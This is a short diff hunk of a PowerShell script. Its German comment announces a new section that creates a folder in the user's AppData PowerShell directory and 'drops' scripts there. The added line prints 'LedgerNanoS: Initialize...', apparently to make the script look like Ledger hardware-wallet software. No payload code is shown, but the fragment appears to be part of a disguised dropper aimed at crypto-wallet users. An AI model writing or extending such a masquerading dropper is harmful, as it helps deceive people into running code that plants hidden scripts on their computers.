@@ -6,7 +6,7 @@ Add-Type -AssemblyName System.Drawing
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 } catch {}
-
+Write-Output "LedgerNanoS: Initialize..."
 # ==================== NEUER TEIL: ORDNER ERSTELLEN UND SCRIPTS DROPPEN ====================
 # Zielordner (dynamisch für aktuellen User)
 $basePowerShellFolder = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell"
